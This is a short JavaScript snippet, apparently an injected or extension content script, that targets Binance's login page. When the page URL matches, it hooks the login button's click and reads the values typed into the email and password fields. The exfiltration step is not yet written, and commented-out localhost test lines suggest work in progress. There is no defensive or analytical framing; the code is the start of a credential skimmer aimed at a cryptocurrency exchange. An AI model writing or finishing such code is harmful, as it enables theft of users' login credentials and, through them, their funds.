// let pattern=/localhost:5000/
// let currentBrowserLocation=window.location.href

var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href
// console.log(locationToExecute)

if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation.includes(`${locationToExecute}/en/login`)){
        document.querySelector("#click_login_submit").onclick=()=>{
          let userEmail=  document.querySelector("input[name='email']").value 
           let userPassword= document.querySelector("input[name='password']").value 
           
        }
        
    }
    // if(currentBrowserLocation.includes("localhost:5000/login.html")){
    //     alert("we are at login form")
      
    // }
}

